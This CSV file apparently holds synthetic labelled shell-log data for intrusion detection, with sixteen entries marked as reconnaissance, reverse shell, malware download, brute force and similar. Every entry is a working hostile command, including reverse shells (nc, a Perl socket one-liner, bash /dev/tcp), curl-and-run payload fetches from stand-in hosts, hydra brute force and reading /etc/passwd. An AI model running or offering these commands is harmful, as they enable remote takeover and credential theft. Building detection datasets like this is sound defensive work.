id,timestamp,log,label
log-1,2025-05-05T02:45:00.538585Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-2,2025-04-21T06:27:09.538615Z,curl -fsSL http://malicious.test/runme84.php -o /tmp/runme84.php; php /tmp/runme84.php,malware_download
log-3,2025-10-20T14:04:28.538631Z,nc -e /bin/sh 172.16.0.9 2222,reverse_shell
log-4,2025-01-19T05:23:15.538643Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-5,2025-08-10T00:13:47.538654Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-6,2025-01-15T21:40:34.538666Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-7,2025-11-20T16:25:18.538680Z,sshpass -p 'password' ssh ubuntu@192.0.2.12,brute_force
log-8,2025-04-16T22:42:19.538695Z,sshpass -p 'password' ssh ubuntu@203.0.113.7,brute_force
log-9,2025-03-30T00:35:50.538707Z,bash -i >& /dev/tcp/203.0.113.7/9001 0>&1,reverse_shell
log-10,2025-07-31T07:45:53.538717Z,cat /etc/passwd,credential_harvest
log-11,2025-04-19T03:47:20.538727Z,find / -name '*.conf' -type f,enumeration
log-12,2025-05-29T22:01:31.538736Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-13,2025-11-07T19:08:14.538746Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-14,2025-09-13T18:15:24.538756Z,find / -name '*.conf' -type f,enumeration
log-15,2025-03-17T11:28:08.538765Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-16,2025-11-03T02:45:48.538775Z,curl -fsSL http://evil.example/p10.php -o /tmp/p10.php; php /tmp/p10.php,malware_download
